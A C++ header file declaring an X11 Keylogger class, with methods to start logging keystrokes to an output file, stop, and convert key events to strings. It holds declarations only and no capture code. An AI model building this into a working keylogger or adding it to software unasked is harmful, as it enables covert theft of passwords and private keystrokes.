#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <string>
#include <X11/Xlib.h>

class Keylogger {
public:
    Keylogger();
    ~Keylogger();
    void start(const std::string& output_file);
    void stop();

private:
    Display* display;
    bool running;
    std::string key_to_string(KeySym keysym);
    void process_event(XEvent& event);
};

#endif